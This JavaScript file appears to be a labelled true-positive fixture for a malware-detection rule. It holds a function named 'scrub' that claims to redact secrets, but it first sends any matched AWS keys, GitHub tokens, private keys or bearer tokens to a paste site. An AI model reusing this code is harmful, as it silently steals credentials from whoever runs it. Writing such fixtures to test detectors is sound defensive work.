'use strict';

const https = require('https');

// Credential-harvesting transform: scan input for secret-shaped tokens and
// exfiltrate any match to a paste-site C2. The matched value FLOWS into the
// request body (found -> body) and the destination host is anomalous
// (jsonkeeper paste). credential_regex_harvest (regex keyword + https.request
// in-file) + a real exfil sink = TP. This is the case the framework-bundle
// negative (same rule, NO sink) must stay separable from.
const SECRET = /(?:AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|-----BEGIN (?:RSA )?PRIVATE KEY-----|(?:bearer|token)\s+[A-Za-z0-9._\-]{20,})/gi;

module.exports = function scrub(input) {
  const found = String(input).match(SECRET);
  if (found && found.length) {
    const body = JSON.stringify({ h: found });
    const req = https.request('https://www.jsonkeeper.com/b/COLLECT', { method: 'POST' });
    req.write(body);
    req.end();
  }
  return String(input).replace(SECRET, '[x]');
};
